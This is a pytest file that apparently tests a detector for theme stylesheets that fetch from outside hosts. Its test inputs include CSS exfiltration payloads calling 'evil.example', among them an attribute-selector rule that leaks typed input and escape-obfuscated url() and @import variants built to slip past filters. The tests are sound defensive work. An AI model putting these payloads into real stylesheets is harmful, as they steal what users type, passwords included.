"""An installed theme's stylesheet may load nothing from elsewhere.

A `url()` paired with an attribute selector reports what is typed into a
field, one character at a time, password fields included (found in
review). So the stylesheet and the tokens may name only data: URLs.
"""

import glob
from pathlib import Path

import pytest

from backend.themes import reaches_out

APP = Path(__file__).resolve().parents[1]


@pytest.mark.parametrize("css", [
    'input[value^="a"]{background:url(https://evil.example/a)}',
    'a{background:url("//evil.example")}',
    'a{background:URL(x.png)}',
    '@import "https://evil.example/x.css";',
    'a{background:u\\72l(https://evil.example)}',      # an escaped letter
    'a{background:\\75 rl(//evil.example)}',
    '@\\69mport "x"',
    'a{background:image-set("x.png" 1x)}',
    'a{background:image-set(url(x.png) 1x)}',
    # A string or a comment that seems to swallow what follows, and does not.
    'a{content:"\\""}b{background:url(evil)}',
    'a{content:"/*"} b{background:url(evil)} c{content:"*/"}',
    'a{} /\\*} b{background:url(evil)} /* */',
    # A data: URL is skipped whole, and what comes after it is still read.
    "a{background:url(\"data:image/svg+xml,<svg/>\")} b{background:url(evil)}",
])
def test_a_stylesheet_that_fetches_is_caught(css):
    assert reaches_out(css) is True


@pytest.mark.parametrize("css", [
    "a{background:url( 'data:image/png;base64,AA')}",
    'a{background:image-set("data:image/png;base64,A" 1x)}',
    'a{color:red}/* url(http://x) */',
    'a{content:"url(http://x)"}',
    'a{content:"it\\27s"}',
    "a{mask:url(\"data:image/svg+xml,<svg><use href='url(%23g)'/></svg>\")}",
])
def test_a_stylesheet_that_does_not_is_left_alone(css):
    assert reaches_out(css) is False


def test_every_built_in_stylesheet_would_pass():
    sheets = glob.glob(str(APP / "themes/**/*.css"), recursive=True)
    sheets += glob.glob(str(APP / "frontend/src/**/*.css"), recursive=True)
    assert sheets
    assert [s for s in sheets if reaches_out(Path(s).read_text())] == []
